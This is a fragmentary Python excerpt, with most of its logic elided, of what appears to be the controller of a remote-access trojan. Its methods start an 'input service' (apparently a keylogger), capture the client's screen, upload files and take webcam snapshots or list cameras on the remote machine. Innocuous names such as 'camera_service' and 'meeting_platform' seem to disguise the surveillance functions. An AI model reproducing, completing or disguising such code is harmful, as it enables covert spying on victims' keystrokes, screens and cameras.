...
################################################################################
    ...
    def input_service(self, option):
        if option == 'start':
            ...
            if not resp.startswith('[*]'):
                st_logger(resp,self.cli_dwld,'input_service')
        elif option == 'status':
    ...
    def screen_capture(self):
        self.pyexec('screen_capture.py',pylib=True)
        st_print(self.receive())
    ...
    def upload(self, f_name, to_cwd=True):
        ...
        if u_file != '':
            ...
            if os.path.exists(u_file_path):
                ...
                u_zip_path = os.path.join(meeting_platform_temp_path, u_zip)
    ...
    def camera_servicesnap(self, cam_dev):
        self.pyexec('camera_serviceSnap.py',pylib=True)
        if cam_dev:
            self.send(cam_dev)
        else:
            if windows_client(system=self.cli_os):
    ...
    def camera_servicelist(self):
        self.pyexec('camera_serviceList.py',pylib=True)
        resp = self.receive()
        if windows_client(system=self.cli_os):
            st_print(resp)
            if no_error(resp):
